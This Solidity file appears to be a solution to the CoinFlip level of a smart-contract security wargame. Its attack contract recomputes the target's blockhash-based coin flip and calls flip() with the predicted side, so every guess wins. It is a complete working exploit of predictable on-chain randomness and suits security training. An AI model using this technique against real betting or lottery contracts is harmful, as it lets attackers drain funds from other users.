// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts/contracts/math/SafeMath.sol";
import "../levels/CoinFlip/CoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;

    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) public {
        target = CoinFlip(_target);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1;

        require(target.flip(side), "Flip was unsuccessful");
    }
}
